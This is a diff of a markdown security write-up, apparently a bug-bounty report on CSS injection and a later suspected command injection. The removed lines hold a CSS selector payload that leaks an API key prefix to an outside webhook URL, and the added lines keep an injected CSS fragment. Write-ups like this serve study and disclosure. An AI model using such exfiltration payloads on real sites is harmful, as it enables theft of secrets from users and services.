@@ -168,14 +168,8 @@ With CSS injection, I could inject a full `<div>` like this.
 We used CSS selectors to exfiltrate:
 
 ```css
-div[data-internal-api-key^="sk_"] {
-    background: url("https://webhook.com/leak?c=sk_");
-}
-```
-
-```css
 sans-serif'; div {
-    background-image: url('https://media.giphy.com/media/SggILpMXO7Xt6/giphy.gif');
+    background-image: url('<https://media.giphy.com/media/SggILpMXO7Xt6/giphy.gif>');
 }
 ```
 
@@ -249,7 +243,7 @@ Now I could send requests to:
 When sending, I got back:
 
 ```json
-{"message":"Filename processed successfully.","details":"    0 image files updated\\n    1 files weren't updated due to errors\n"}
+{"message":"Filename processed successfully.","details":"    0 image files updated\n    1 files weren't updated due to errors\n"}
 ```
 
 From the message I suspected **command injection**. I started testing:
